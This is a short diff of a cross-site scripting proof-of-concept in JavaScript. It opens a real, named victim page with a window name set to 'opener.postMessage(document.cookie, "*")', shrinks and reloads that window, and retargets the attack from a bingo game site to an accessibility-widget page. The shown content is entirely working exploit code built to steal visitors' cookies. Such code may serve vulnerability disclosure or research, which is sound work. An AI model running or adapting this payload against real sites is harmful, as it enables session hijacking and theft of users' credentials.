@@ -15,7 +15,7 @@ payload = 'opener.postMessage(document.cookie, "*")';
 
 onclick = () => {
   // Open the victim page.
-  w = open('https://play.bingoblitz.com/', payload, 'width=10,height=10');
+  w = open('https://www.equalweb.com/10419/11528/auto_ai_accessibility_widget', payload, 'width=10,height=10');
   w.resizeBy('-100', '-100');
 
   setInterval(() => {
@@ -44,7 +44,7 @@ function tryXSS(w) {
 
   setTimeout(() => {
     // Reload the page.
-    w.location = 'https://play.bingoblitz.com/';
+    w.location = 'https://www.equalweb.com/10419/11528/auto_ai_accessibility_widget';
   }, 4000);
 }
 ```
